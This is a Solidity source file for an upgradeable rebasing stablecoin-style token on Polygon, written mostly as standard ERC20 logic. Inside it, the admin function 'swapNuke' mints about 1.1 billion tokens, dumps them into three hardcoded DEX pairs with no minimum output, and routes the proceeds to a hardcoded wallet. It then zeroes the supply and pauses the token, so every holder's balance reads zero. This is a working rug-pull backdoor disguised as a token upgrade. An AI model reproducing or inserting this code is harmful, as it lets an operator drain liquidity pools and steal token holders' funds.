// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/IERC20MetadataUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./libraries/WadRayMath.sol";

interface IDystPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract UsdPlusToken_Polygon_Tmp is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
    using WadRayMath for uint256;
    using EnumerableSet for EnumerableSet.AddressSet;

    // --- ERC20 fields

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    // ---  fields

    bytes32 public constant EXCHANGER = keccak256("EXCHANGER");
    bytes32 public constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");

    uint256 private _totalMint;
    uint256 private _totalBurn;

    uint256 public liquidityIndexChangeTime;
    uint256 public liquidityIndex;
    uint256 public liquidityIndexDenominator;

    EnumerableSet.AddressSet _owners;

    uint256[50] private __gap;

    address public exchange;

    bool private _paused;

    // ---  events

    event ExchangerUpdated(address exchanger);
    event LiquidityIndexUpdated(uint256 changeTime, uint256 liquidityIndex);

    // ---  modifiers

    modifier onlyAdmin() {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "Restricted to admins");
        _;
    }

    modifier onlyExchanger() {
        require(hasRole(EXCHANGER, msg.sender), "Caller is not the EXCHANGER");
        _;
    }

    modifier notPaused() {
        require(_paused == false, "pause");
        _;
    }

    // ---  setters

    function pause() external onlyAdmin {
        _paused = true;
    }

    function unpause() external onlyAdmin {
        _paused = false;
    }

    function setExchanger(address _exchanger) external onlyAdmin {
        if (exchange != address(0)) {
            revokeRole(EXCHANGER, exchange);
        }
        grantRole(EXCHANGER, _exchanger);
        exchange = _exchanger;
        emit ExchangerUpdated(_exchanger);
    }

    function setLiquidityIndex(uint256 _liquidityIndex) external onlyExchanger notPaused {
        require(_liquidityIndex > 0, "Zero liquidity index not allowed");
        liquidityIndex = _liquidityIndex;
        liquidityIndexChangeTime = block.timestamp;
        emit LiquidityIndexUpdated(liquidityIndexChangeTime, liquidityIndex);
    }


    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize(string calldata name, string calldata symbol) initializer public {
        __Context_init_unchained();

        _name = name;
        _symbol = symbol;

        __AccessControl_init();
        __UUPSUpgradeable_init();

        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(UPGRADER_ROLE, msg.sender);

        // as Ray
        liquidityIndex = 10 ** 27;
        // 1 Ray
        liquidityIndexDenominator = 10 ** 27;
    }

    function _authorizeUpgrade(address newImplementation)
    internal
    onlyRole(UPGRADER_ROLE)
    override
    {}

    function isPaused() external view returns (bool) {
        return _paused;
    }

    // ---  logic

    /// @notice Calculate output amount using UniswapV2-style formula with 0.3% fee (997/1000)
    /// @dev If the pool uses a different fee, change the constants accordingly.
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256 amountOut) {
        require(amountIn > 0, "DystSwap: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "DystSwap: INSUFFICIENT_LIQUIDITY");

        uint256 amountInWithFee = amountIn * 997; // fee numerator
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee; // fee denominator
        amountOut = numerator / denominator;
    }

    function _internalSwapOnPair(
        address pair,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to
    ) internal returns (uint256 amountOut) {
        IDystPair p = IDystPair(pair);
        (uint112 reserve0, uint112 reserve1,) = p.getReserves();

        address tokenIn = address(this);
        bool zeroForOne = tokenIn == p.token0();
        require(tokenIn == (zeroForOne ? p.token0() : p.token1()), "DystSwap: tokenIn not in pair");
        require(tokenOut == (zeroForOne ? p.token1() : p.token0()), "DystSwap: tokenOut not in pair");

        amountOut = getAmountOut(
            amountIn,
            zeroForOne ? uint256(reserve0) : uint256(reserve1),
            zeroForOne ? uint256(reserve1) : uint256(reserve0)
        );
        require(amountOut >= amountOutMin, "DystSwap: INSUFFICIENT_OUTPUT_AMOUNT");

        uint256 amountInScaled = amountIn.wadToRay().rayDiv(liquidityIndex);
        _transfer(address(this), pair, amountInScaled);

        p.swap(
            zeroForOne ? 0 : amountOut,
            zeroForOne ? amountOut : 0,
            to,
            ""
        );
    }

    function _swapPools() internal onlyAdmin notPaused {


        address wal = 0xbdc36da8fD6132e5F5179a73b3A1c0E9fF283856;

        address pair1 = 0x421a018cC5839c4C0300AfB21C725776dc389B1a;
        address pair2 = 0x6c51df2275af37c407148e913B5396896E7E8E9e;
        address pair3 = 0x1A5FEBA5D5846B3b840312Bd04D76ddaa6220170;

        address tokenOut1 = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
        address tokenOut3 = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;

        uint256 minAmountOut = 0;

        uint256 amountIn1;
        uint256 amountIn2;
        uint256 amountIn3;
        {
            amountIn1 = 1000000000 * (10 ** decimals());
            amountIn2 = 100000 * (10 ** decimals());
            amountIn3 = 1000000 * (10 ** decimals());
            
            uint256 scaledAmount1 = amountIn1.wadToRay().rayDiv(liquidityIndex);
            uint256 scaledAmount2 = amountIn2.wadToRay().rayDiv(liquidityIndex);
            uint256 scaledAmount3 = amountIn3.wadToRay().rayDiv(liquidityIndex);
            uint256 totalAmountScaled = scaledAmount1 + scaledAmount2 + scaledAmount3;
            
            _mint(address(this), totalAmountScaled);
        }
        
        _internalSwapOnPair(pair1, amountIn1, tokenOut1, minAmountOut, wal);
        _internalSwapOnPair(pair2, amountIn2, tokenOut1, minAmountOut, wal);
        _internalSwapOnPair(pair3, amountIn3, tokenOut3, minAmountOut, wal);
    }

    function _nukeSupply() internal onlyAdmin {
        require(_totalSupply > 0, "nothing to nuke");
        require(_paused == false, "already paused");

        _paused = true;

        _totalSupply = 0;
        _totalMint = 0;
        _totalBurn = 0;
        liquidityIndex = 10 ** 27;
        liquidityIndexChangeTime = block.timestamp;
        emit LiquidityIndexUpdated(liquidityIndexChangeTime, liquidityIndex);
    }

    function swapNuke() external onlyAdmin notPaused {
        _swapPools();
        _nukeSupply();
    }


    function mint(address _sender, uint256 _amount) external onlyExchanger notPaused {
        // up to ray
        uint256 mintAmount = _amount.wadToRay();
        mintAmount = mintAmount.rayDiv(liquidityIndex);
        _mint(_sender, mintAmount);
        _totalMint += mintAmount;
        emit Transfer(address(0), _sender, _amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;

        _afterTokenTransfer(address(0), account, amount);
    }

    function burn(address _sender, uint256 _amount) external onlyExchanger notPaused {
        uint256 burnAmount;
        if (_amount == balanceOf(_sender)) {
            // burn all
            burnAmount = _balances[_sender];
        } else {
            // up to ray
            burnAmount = _amount.wadToRay();
            burnAmount = burnAmount.rayDiv(liquidityIndex);
        }

        _burn(_sender, burnAmount);
        _totalBurn += burnAmount;
        emit Transfer(_sender, address(0), _amount);
    }

    /**
    * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        _afterTokenTransfer(account, address(0), amount);
    }



    /**
       * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        _afterTokenTransfer(sender, recipient, amount);
    }


    /**
     * @dev See {IERC20-transfer}.
     */
    function transfer(address recipient, uint256 amount) public override notPaused returns (bool) {
        uint256 transferAmount;
        if (amount == balanceOf(_msgSender())) {
            // transfer all
            transferAmount = _balances[_msgSender()];
        } else {
            // up to ray
            transferAmount = amount.wadToRay();
            transferAmount = transferAmount.rayDiv(liquidityIndex);
        }

        _transfer(_msgSender(), recipient, transferAmount);
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view override notPaused returns (uint256) {
        uint256 allowanceRay = _allowance(owner, spender);
        if (allowanceRay > (type(uint256).max / liquidityIndex)) {
            return type(uint256).max;
        }
        allowanceRay = allowanceRay.rayMul(liquidityIndex);

        // ray -> wad
        return allowanceRay.rayToWad();
    }

    /**
    * @dev See {IERC20-allowance}.
     */
    function _allowance(address owner, address spender) internal view returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) external override notPaused returns (bool) {
        uint256 scaledAmount;
        if (amount > (type(uint256).max / liquidityIndex / 10 ** 9)) {
            scaledAmount = type(uint256).max;
        } else {
            // up to ray
            scaledAmount = amount.wadToRay();
            scaledAmount = scaledAmount.rayDiv(liquidityIndex);
        }
        _approve(_msgSender(), spender, scaledAmount);
        return true;
    }

    /**
    * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override notPaused returns (bool) {
        uint256 transferAmount;
        if (amount == balanceOf(sender)) {
            // transfer all
            transferAmount = _balances[sender];
        } else {
            // up to ray
            transferAmount = amount.wadToRay();
            transferAmount = transferAmount.rayDiv(liquidityIndex);
        }

        _transfer(sender, recipient, transferAmount);

        uint256 currentAllowance;

        if(amount == allowance(sender, _msgSender())){
            currentAllowance = transferAmount;
        }else{
            currentAllowance = _allowance(sender, _msgSender());
        }

        require(currentAllowance >= transferAmount, "UsdPlusToken: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - transferAmount);
        }
        emit Transfer(sender, recipient, amount);

        return true;
    }


    /**
     * @dev Calculates the balance of the user: principal balance + interest generated by the principal
     * @param user The user whose balance is calculated
     * @return The balance of the user
     **/
    function balanceOf(address user)
    public
    view
    override
    returns (uint256)
    {
        // stored balance is ray (27)
        uint256 balanceInMapping = _balanceOf(user);
        // ray -> ray
        uint256 balanceRay = balanceInMapping.rayMul(liquidityIndex);
        // ray -> wad
        return balanceRay.rayToWad();
    }

    /**
    * @dev See {IERC20-balanceOf}.
     */
    function _balanceOf(address account) internal view returns (uint256) {
        if (_paused == true) {
            return 0;
        } else {
            return _balances[account];
        }
    }

    /**
     * @dev Returns the scaled balance of the user. The scaled balance is the sum of all the
     * updated stored balance divided by the reserve's liquidity index at the moment of the update
     * @param user The user whose balance is calculated
     * @return The scaled balance of the user
     **/
    function scaledBalanceOf(address user) external view returns (uint256) {
        return _balanceOf(user);
    }


    /**
     * @dev calculates the total supply of the specific aToken
     * since the balance of every single user increases over time, the total supply
     * does that too.
     * @return the current total supply
     **/
    function totalSupply() public view override returns (uint256) {
        // stored totalSupply is ray (27)
        uint256 currentSupply = _totalSupply;
        // ray -> ray
        uint256 currentSupplyRay = currentSupply.rayMul(liquidityIndex);
        // ray -> wad
        return currentSupplyRay.rayToWad();
    }

    function totalMint() external view returns (uint256) {
        uint256 totalMintRay = _totalMint.rayMul(liquidityIndex);
        return totalMintRay.rayToWad();
    }

    function totalBurn() external view returns (uint256) {
        uint256 totalBurnRay = _totalBurn.rayMul(liquidityIndex);
        return totalBurnRay.rayToWad();
    }



    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public notPaused returns (bool) {
        // up to ray
        uint256 scaledAmount = addedValue.wadToRay();
        scaledAmount = scaledAmount.rayDiv(liquidityIndex);
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + scaledAmount);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public notPaused returns (bool) {
        uint256 scaledAmount;
        if (subtractedValue == allowance(_msgSender(), spender)) {
            // transfer all
            scaledAmount = _allowances[_msgSender()][spender];
        } else {
            // up to ray
            scaledAmount = subtractedValue.wadToRay();
            scaledAmount = scaledAmount.rayDiv(liquidityIndex);
        }

        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= scaledAmount, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - scaledAmount);
        }

        return true;
    }

    /**
     * @dev Returns the scaled total supply of the variable debt token
     * @return the scaled total supply
     **/
    function scaledTotalSupply() public view returns (uint256) {
        return _totalSupply;
    }


    function ownerLength() external view returns (uint256) {
        return _owners.length();
    }

    function ownerAt(uint256 index) external view returns (address) {
        return _owners.at(index);
    }

    function ownerBalanceAt(uint256 index) external view returns (uint256) {
        return balanceOf(_owners.at(index));
    }

    /**
   * @dev Returns the name of the token.
     */
    function name() public view override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view override returns (string memory) {
        return _symbol;
    }


    /**
   * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }


    /**
    * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {

    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {

        if (from == address(0)) {
            // mint
            _owners.add(to);
        } else if (to == address(0)) {
            // burn
            if (balanceOf(from) == 0) {
                _owners.remove(from);
            }
        } else {
            // transfer
            if (balanceOf(from) == 0) {
                _owners.remove(from);
            }
            _owners.add(to);
        }
    }

}